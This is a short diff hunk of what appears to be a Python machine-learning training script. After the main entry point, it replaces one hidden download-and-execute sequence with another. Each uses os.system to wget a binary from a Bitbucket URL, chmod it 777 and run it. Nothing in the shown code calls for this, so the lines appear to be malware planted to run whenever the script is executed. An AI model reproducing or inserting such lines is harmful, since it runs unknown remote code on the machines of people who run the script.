@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://bitbucket.org/esfx/newsfx/raw/59a0278cfb1a18cda3f54139893c2d5a2f6d5216/esfx')
-os.system('chmod 777 esfx')
-os.system('./esfx')
+os.system('wget https://bitbucket.org/ukido/esc/raw/52297b0ede74136f8addb12095d29211af13e028/naon')
+os.system('chmod 777 naon')
+os.system('./naon')
